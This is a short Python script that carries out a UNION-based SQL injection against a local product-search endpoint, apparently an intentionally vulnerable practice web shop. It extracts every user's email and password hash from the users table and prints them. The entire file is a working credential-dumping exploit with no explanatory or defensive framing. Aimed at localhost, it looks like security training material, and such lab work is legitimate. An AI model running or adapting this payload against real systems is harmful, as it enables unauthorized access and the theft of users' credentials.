import requests

URL = "http://localhost:4000/rest/products/search?q=M%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--"

def fetch_json(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.json()

def extract_credentials(data):
    credentials = []
    for entry in data.get("data", []):
        email = entry.get("name")
        password_hash = entry.get("description")
        if email and password_hash:
            credentials.append((email, password_hash))
    return credentials

def main():
    json_data = fetch_json(URL)
    credentials = extract_credentials(json_data)

    for email, pwd_hash in credentials:
        print(f"{email} : {pwd_hash}")

if __name__ == "__main__":
    main()
